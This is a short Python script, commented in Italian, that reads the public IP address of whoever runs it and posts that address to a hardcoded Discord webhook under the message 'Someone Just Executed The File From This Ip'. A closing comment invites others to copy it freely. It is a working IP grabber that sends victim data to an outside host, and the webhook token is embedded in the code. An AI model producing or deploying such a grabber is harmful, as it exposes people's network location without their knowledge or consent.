import discord
import requests

# Sostituisci l'URL del webhook con l'URL del tuo webhook Discord
WEBHOOK_URL = 'https://discord.com/api/webhooks/1031238129841078281/OFGqs6esp1NlYcLtJLKnSLRYV5Wla0uTlgCqoiI9xzOdqjFicb_IZI6rrewwXqgMx2MQ'

# Ottieni l'indirizzo IP pubblico dell'utente
ip_address = requests.get('https://api.ipify.org').text

# Crea l'embed
embed = discord.Embed(title=f'Someone Just Executed The File From This Ip {ip_address}', description='L\'https://github.com/Vskbi', color=0x00ff00)

# Invia l'embed utilizzando il webhook
requests.post(WEBHOOK_URL, json={'embeds': [embed.to_dict()]})

# ALL OPEN SOURCE FOR YALL BE FREE TO SKID THIS
